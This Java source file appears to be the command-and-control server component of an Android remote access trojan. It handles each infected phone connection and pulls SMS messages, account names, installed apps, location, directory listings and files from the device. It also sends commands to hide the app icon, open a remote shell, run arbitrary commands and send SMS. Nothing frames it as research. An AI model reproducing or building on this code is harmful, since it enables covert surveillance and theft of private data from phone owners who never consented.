/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.test.server5;


import static com.test.server5.formServer5.textAreaDebugInfo_public;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.*;
import javax.swing.DefaultListModel;


public class EchoThread extends Thread {
    protected Socket socket;
     DataOutputStream out = null;
     InputStream inp = null;
     BufferedReader brinp = null;
     int cantAccs = 0;
     protected String id;
     protected String ip;
     protected String mac;
     protected String  sysInfo ="";
     protected String  model;
     protected String  version;
     protected String  device;
     protected String  product;
     protected String  manufacturer;
     protected String  sdk;
     protected int shell;
     protected String  brand;
     protected String deviceID;
     protected String nameAndPhone;
     private ArrayList<String> savedSMSInbox = new ArrayList<>();
     private ArrayList<String> savedSMSSent = new ArrayList<>();
     private ArrayList<String> userAccounts = new ArrayList<>();
     private boolean fileDownload = false;
     private String file = "";
     private FileOutputStream fileOutputStream;
     private  BufferedOutputStream  bufferedOutputStream;
     private boolean gettingFile;
     public String pathType ="/";
    
     
    
    int current = 0;
    String fileLength = "";
    
    BufferedOutputStream bos;
    ObjectInputStream ois;
    FileOutputStream fos;

    public EchoThread(Socket clientSocket) { this.socket = clientSocket; } 
    
    public String getIP(){ return ip; } 
    
    public String getMAC(){ return mac; }
    
    protected String getID(){ return this.id; }
    
    protected String getVersion(){ return this.version; }
    
    protected String getModel(){ return this.model; }

    protected String getManufacturer(){ return this.manufacturer; }
    
    public String getSysInfo(){ return this.sysInfo; }
    
    public String getDeviceID(){ return this.deviceID; }
    
    public Socket getSocket(){ return this.socket; } 

    public void setSocket(Socket sockett){ this.socket = sockett; }
    
    protected boolean shellIsOn() { return this.shell == 1; }
    
    public void setUserAccs(String accs) {    }
    
    public void die() throws IOException {  socket.close();  }
    
    public String[] getUsInfo()
    { 
        return new String[] { this.id,this.mac,this.brand,this.manufacturer,this.model,this.version,this.sdk,this.ip,this.deviceID,this.nameAndPhone };
    }
    
    public void setUserInfo(String id,String mac,String brand,String manufacturer,String model,String version,String sdk,String ip,String deviceID )
    { 
        this.id=id; this.ip=ip; this.mac="";
        this.brand=brand;
        this.version=version;
        this.model=model;
        this.manufacturer=manufacturer;
        this.model=model;
        this.sdk=sdk;
        this.deviceID = deviceID;
        //set omfp 
    }
   
    // THIS EXECUTE WHEN THREAD START
    public void run(){
        FileOutputStream out2;
        try {
            inp = socket.getInputStream();  
            brinp = new BufferedReader(new InputStreamReader(inp,"UTF-8")); 
            out = new DataOutputStream(socket.getOutputStream());       
            System.out.println("New Connection - 1");
        } catch (IOException e) {
            e.printStackTrace();
        }  
        String line;        
        while (true) {
            try {
                line = brinp.readLine(); 
                if(line==null){
                    socket.close(); return;
                }
                 if(line.contains("smsin:")) {
                       String saveSmsS="";
                       String[] smss = line.split(",_,,_");
                       for(int i =0; i < smss.length;i++){ saveSmsS += smss[i] + "\n"; }
                       savedSMSInbox.add(line);
                       formServer5.setGetSMSLogAndSave(saveSmsS,"1");
                }else if(line.contains("smssent:")){
                    
                       String saveSmsS="";
                       String[] smss = line.split(",_,,_");
                       for(int i =0; i < smss.length;i++){ saveSmsS += smss[i] + "\n"; }
                       savedSMSSent.add(line);
                       formServer5.setGetSMSLogAndSave(saveSmsS,"2");
                    
                }else if(line.contains("_system_info=>")) {
                    
                    String[] sinfo = line.split("=>=>")[1].split("__-_");
                    if(sinfo.length > 0){
                        for(int ix =0; ix < sinfo.length; ix++){
                            String[] sinfoArr = sinfo[ix].split("=>");
                            String type = sinfoArr[0];
                            String value = sinfoArr.length > 1 ?  sinfoArr[1] : "err_sysinfo_x1";
                            if( ( !type.equals(null) && value != null) && (value.length() >1 && type.length() >1) ){
                                this.sysInfo += type + "=>" + value+ "\n";
                            }
                        }
                    }else{
                        System.out.println("__-Bad_SysInfo ==> " +line );
                    } 
                    formServer5.addConnected(this.sysInfo, this); 
                     
                }else if(line.contains("acsnam")) {
                    
                     String accName = line.split(":::>>")[1].split(",,,")[0];
                     String accType = line.split(":::>>")[1].split(",,,")[1];
                     userAccounts.add(accType + " : " + accName); cantAccs++;
                     
                }else if(line.contains("dirsreturn==>>")) {
                     String ret = "";
                     String[] dirs = line.split("==>>")[1].split("-,-,-,,");
                     for(int i = 0; i< dirs.length;i++){
                         if(dirs[i].contains("_ds-_")){
                             String[] subDirs = dirs[i].split("_ds-_");
                             ret+="<h2>Dirs & Files for: "+"<i style=\"color:blue\">" +subDirs[0]+"</i></h2><br><ul style=\"list-style:none\">";
                              formServer5.getSelectedClient("").dirs  += subDirs[0]+"_ds-_";
                             for(int x =0; x < subDirs.length;x++){
                                 if(x != 0) { 
                                     if(subDirs[x].indexOf("isdir_") >= 0){
                                        ret+= "<li><small style=\"color:#281FD3\">[DIR]</small>"+subDirs[x].replace("isdir_","")+"</li>"; formServer5.getSelectedClient("").dirs +=subDirs[x] + "_ds-_"; 
                                     }else{
                                        if(subDirs[x].contains(".mp4") || subDirs[x].contains(".3gp") || subDirs[x].contains(".avi") || subDirs[x].contains(".WMV") || subDirs[x].contains(".mov") || subDirs[x].contains(".mkv") || subDirs[x].contains(".flv")){
                                           System.out.println(" -- ViDE0 FouND !! --");
                                           formServer5.getSelectedClient("").vids.add(subDirs[x]);                                         
                                        }else{
                                           System.out.println(" --  NO -- ");
                                        }
                                         ret+= "<li>"+subDirs[x]+"</li>"; formServer5.getSelectedClient("").dirs +=subDirs[x] + "_ds-_"; 
                                     }
                                 }
                             }
                             formServer5.getSelectedClient("").dirs+="-_-,_-,-_-";
                             ret+= "</ul><hr>";
                         }else{
                              ret+="<h2><i style=\"color:blue\">" +dirs[i]+"</i></h2><br> <hr>"; 
                         }
                     } 
                     formServer5.saveInterestingPaths(ret,this.id); 
                }else if(line.equals("_errstrshl_")) {
                    
                    formServer5.textAreaDebugInfo_public.setText(formServer5.textAreaDebugInfo_public.getText()+" ### Error Staring Shell ###\n");
               
                }else if(line.equals("_shutdownshell_")) {
                     
                    formServer5.textAreaDebugInfo_public.setText(formServer5.textAreaDebugInfo_public.getText()+"\n\n"+ "========== Shell Is CLOSED =========="+"\n\n");
                    formServer5.setShellDisabled();
                    this.shell=0;
                    
                }else if(line.equals("_shell_ok_")) { 
                    
                    formServer5.textAreaDebugInfo_public.setText("\n"+ "========== Shell Is ON =========="+"\n\n");
                    formServer5.setShellEnabled();
                    this.shell=1;
                    
                }else if(line.contains("_installed_apps_=>")) {
                     
                    String all = line.split("_=>")[1];
                    String[] apps = all.split("-_-_-__");
                    DefaultListModel mUser = new DefaultListModel();
                    DefaultListModel mSys = new DefaultListModel(); 
                    for( String app : apps){
                         String[] a = app.split("=>");
                         String t = a[0]; String n = a[1];
                         if(t.equals("sysapps")){
                             formServer5.getSelectedClient("").installedAppsSystem.add(n);
                             mSys.addElement(n);
                         } 
                         if(t.equals("userapps")){
                             formServer5.getSelectedClient("").installedAppsUser.add(n);
                             mUser.addElement(n);
                         }
                     }
                     formServer5.listUserApps2.setModel(mUser);
                     formServer5.listSystemApps2.setModel(mSys);
                     textAreaDebugInfo_public.setText( textAreaDebugInfo_public.getText() + " -- Apps successfully obtained -- \n" );
                     
                }else if(line.contains("..otherCommand..")) { 
                     
                }else if(line.equals("..otherCommand..")) {
                     
                }else if(line.equals("..otherCommand..")) {
                     
                }else if(line.equals("..otherCommand..")) {
                     
                }else if(line.contains("__geo__::>>")) {
                    
                    String geo = line.split("::>>")[1];
                    formServer5.jTextFieldGeoloc2.setText(geo); 
                     
                }else if(line.equals("_send-file_")) {
                     
                    formServer5.textAreaDebugInfo_public.setText(formServer5.textAreaDebugInfo_public.getText()+"\n...Downloading File...\n");
                    
                }else if(line.contains("download-error_=>")){
                   String[] error = line.split("::>>");
                   if(error.length > 1)
                      formServer5.textAreaDebugInfo_public.setText(formServer5.textAreaDebugInfo_public.getText()+"Error downloading file: >>> "+error[1]+" <<<\n" );
                   else
                      formServer5.textAreaDebugInfo_public.setText(formServer5.textAreaDebugInfo_public.getText()+"Error downloading file\n" );
                }else{
                    if(shellIsOn()){
                        formServer5.textAreaDebugInfo_public.setText(formServer5.textAreaDebugInfo_public.getText()+"\n"+line+"\n");
                    }else{
                        if(!line.equals("") && !line.equals(" ") && line.length() > 1 ){ 
                           // System.out.println("line: " + line);
                            int fileLength = 0,received =0;
                            String fileFullPath = "",fName="";
                            
                            if(line.contains("_file-length_=>")){
                                 boolean done = false;
                                 fileLength = Integer.parseInt(line.split("=>")[1].split("&&")[0].replace(">", ""));
                                 fileFullPath =  line.split("=>")[1].split("&&")[1];
                            } 
                            try{ 
                                if(fileFullPath.length() > 2){
                                    ClientInfo client = formServer5.getSelectedClient(getID());
                                    fName = fileFullPath.split("/")[ fileFullPath.split("/").length -1 ];
                                    System.out.println(" fName  => " + fName);
                                    File filei = null;
                                    if(fName.contains("thumb_")){
                                       File f = new File( formServer5.selectDownloadFolder_public.getText() + pathType + client.id + pathType + "thumbs" );
                                       if(!f.isDirectory())
                                          f.mkdir();
                                       filei = new File( formServer5.selectDownloadFolder_public.getText() + pathType + client.id +pathType +  "thumbs" +  pathType+fName  );
                                    }else if(fName.contains("_f_t_m_n_")){
                                       File f = new File( formServer5.selectDownloadFolder_public.getText() + pathType + client.id +  pathType +"vidCapsThumbs" );
                                       if(!f.isDirectory())
                                          f.mkdir();
                                       filei = new File( formServer5.selectDownloadFolder_public.getText() + pathType + client.id +  pathType +"vidCapsThumbs" +  pathType+fName  );
                                    }else{
                                       filei = new File( formServer5.selectDownloadFolder_public.getText() + pathType + client.id +  pathType+fName );
                                    }
                                    byte[] bytes = new byte[1024];
                                    BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(filei));
                                    while (true) {
                                        int bytesRead = inp.read(bytes);
                                        received+=bytesRead;
                                        if (bytesRead < 0) break;
                                        if(received >= fileLength)  break;
                                        bos.write(bytes, 0, bytesRead);
                                      //  System.out.println("received:" + received + " & " + "left: " + (fileLength - received) );
                                    }
                                    bos.close(); 
                                    client.downloadedFiles.add(fileFullPath);
                                    formServer5.textAreaDebugInfo_public.setText(formServer5.textAreaDebugInfo_public.getText()+"\n File "+fName+" Download Complete\n");
                                }
                            }catch(IOException e){
                                formServer5.textAreaDebugInfo_public.setText(formServer5.textAreaDebugInfo_public.getText()+"\n ### Error downloading file => "+e.getMessage()+"\n");
                            }
                        }
                    } 
                }
            }catch (IOException e) { 
                System.out.println("errrosaor123");  e.printStackTrace(); 
            }   
        }
    } 
    
    protected String sendCheckSmsPerms()
    {
        try{
            out.write("_get_sms_perms_\n".getBytes("UTF-8"));
            out.flush();
        }catch(IOException e){ return "err2"; }
         return "sent";
    }
     
    protected String  sendGetDirs()
    {
        try{
            out.write("_get-dirs_\n".getBytes("UTF-8"));
            out.flush();
        }catch(IOException e){ return e.getMessage(); }
         return "sent";
    }

    protected void sendHideApp()
    {
        try{
            out.write("_hide_app_\n".getBytes("UTF-8"));
            out.flush();
        }catch(IOException e){ System.out.println( "ERR_0X11 =" + e.getMessage() ); }
    }
     
    protected void sendUnhideApp()
    {
        try{
            out.write("_unhide_app_\n".getBytes("UTF-8"));
            out.flush();
        }catch(IOException e){ System.out.println( "ERR_0X12 =" + e.getMessage() ); }
    }
    
    
    
    protected boolean  sendGetShell()
    {
        try{
            out.write("_getshell_\n".getBytes("UTF-8"));  out.flush();
        }catch(IOException e){ return false; }
         return true;
    } 
    
    protected boolean sendGetVidThumbs(String vidPath)
    {
      String s = "get_video_frame_=>"+vidPath+"&&-\n";       
      try{
        out.write(s.getBytes("UTF-8"));  out.flush();
      }catch(IOException e){ return false; }
       return true;
    }
    
    protected void exitShell()
    {
        try{
            out.write("_close_shell_\n".getBytes("UTF-8"));  out.flush();
        }catch(IOException e){  }
    } 
    
    protected void  sendShellCommand(String cmd)
    {
    /*    try{
            String s = "_cmd:::>>"+cmd+"\n";
            out.write(s.getBytes("UTF-8"));  out.flush();
        }catch(Exception e){  System.out.println("x4");  }*/
         try{
            String s = cmd+"\n";
            out.write(s.getBytes("UTF-8"));  out.flush();
        }catch(IOException e){  System.out.println("errx4");e.printStackTrace();  }
    } 
    
    protected String sendGetApps()
    {
         try{
            String s = "_get-apps_"+"\n";
            out.write(s.getBytes("UTF-8"));  out.flush();
        }catch(IOException e){  System.out.println("errx4");e.printStackTrace();  }
         return "sent";
    }

        
    protected void sendGetLocation()
    {
         try{
            String s = "_get_geo_"+"\n";
            out.write(s.getBytes("UTF-8"));  out.flush();
        }catch(IOException e){  System.out.println("err_send_geoloc");e.printStackTrace();  }
    }
    
    protected String sendSendSms(String num,String msj)
    {
        try{
            String s = "send_sms_=>"+num+"&&&"+msj+"\n";
            out.write(s.getBytes("UTF-8"));  out.flush();
        }catch(IOException e){  System.out.println("errx4");e.printStackTrace();  }
         return "sent";
    }
    
    
    protected void sendDownloadFile(String filePath)
    {
         try{
            String s = "_download-file_=>"+ filePath +"\n";
            out.write(s.getBytes("UTF-8"));  
            out.flush();
        }catch(IOException e){  e.printStackTrace();System.out.println("errx4b");  }
    }

    protected void sendDownloadThumb(String filePath)
    {
         try{
            String s = "_get_thumbs_=>"+ filePath +"\n";
            //s="\n";
            out.write(s.getBytes("UTF-8"));  
            out.flush();
        }catch(IOException e){  e.printStackTrace();System.out.println("errx4b");  }
    }
    
    public String getSMS(String type)
    {
        String t = "1";
        if(type.equals("Sent")) t="2";
        try { 
            String s = "_get__sms_"+t+"\n";
            if(socket.isClosed()) return "closed";
            out.write(s.getBytes("UTF-8"));  out.flush(); 
        } catch (IOException ex) { return "err2";  } 
        return "sent";
    }
    
    private ArrayList<String> getSavedSMS(String type) { 
        if(type.equals("inbox"))   return this.savedSMSInbox; 
        return null;
    }
    
    public boolean isOnline()
    {
        if(socket.isClosed()) return false;
        return true;
    }
}